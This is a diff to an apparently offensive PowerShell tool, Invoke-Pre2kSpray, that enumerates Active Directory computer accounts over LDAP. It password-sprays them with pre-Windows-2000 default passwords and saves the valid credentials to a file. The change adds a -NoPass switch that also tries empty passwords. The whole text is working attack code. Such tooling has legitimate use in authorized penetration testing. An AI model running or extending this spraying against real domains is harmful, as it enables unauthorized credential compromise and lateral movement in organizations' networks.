@@ -31,6 +31,10 @@ function Invoke-Pre2kSpray
 
     Filter out accounts that had the password set in the last 30 days (probably normal machine accounts)
 
+    .PARAMETER NoPass
+
+    Try with an empty password
+
     .EXAMPLE
 
     C:\PS> Invoke-Pre2kSpray -OutFile valid-creds.txt -Domain test.local
@@ -51,6 +55,10 @@ function Invoke-Pre2kSpray
      $Force,
 
      [Parameter(Position = 4, Mandatory = $false)]
+     [switch]
+     $NoPass,
+     
+     [Parameter(Position = 5, Mandatory = $false)]
      [switch]
      $Filter = $false
     )
@@ -107,8 +115,15 @@ function Invoke-Pre2kSpray
     Write-Host -ForegroundColor Yellow "[*] Password spraying has beguns"
     Write-Host "[*] This might take a while depending on the total number of computers"
 
-    Invoke-SpraySinglePassword -Domain $CurrentDomain -UserListArray $ComputerListArray -OutFile $OutFile -DomainFQDN $Domain
-
+    if ($NoPass) 
+    {
+        Invoke-SpraySinglePassword -Domain $CurrentDomain -UserListArray $ComputerListArray -OutFile $OutFile -DomainFQDN $Domain -NoPass
+    }
+    else
+    {
+        Invoke-SpraySinglePassword -Domain $CurrentDomain -UserListArray $ComputerListArray -OutFile $OutFile -DomainFQDN $Domain 
+    }
+    
     Write-Host -ForegroundColor Yellow "[*] Password spraying is complete"
     if ($OutFile -ne "")
     {
@@ -162,6 +177,7 @@ function Get-DomainComputerList
     $ComputerSearcher.SearchRoot = $DirEntry
 
     $ComputerSearcher.filter = "(&(objectClass=computer))"
+
     $ComputerSearcher.PropertiesToLoad.add("samaccountname") > $Null
     $ComputerSearcher.PropertiesToLoad.add("pwdlastset") > $Null
 
@@ -210,7 +226,10 @@ function Invoke-SpraySinglePassword
             $OutFile,
             [Parameter(Position=4)]
             [string]
-            $DomainFQDN
+            $DomainFQDN,
+            [Parameter(Position=5)]
+            [switch]
+            $NoPass
     )
     $time = Get-Date
     $count = $UserListArray.count
@@ -235,6 +254,11 @@ function Invoke-SpraySinglePassword
             $Password = $Password.Substring(0,14)
         }
 
+        if ($NoPass)
+        {
+            $Password = ""
+        }
+      
         try {
             $Context = "Domain"
             $Authtype = "Sealing"
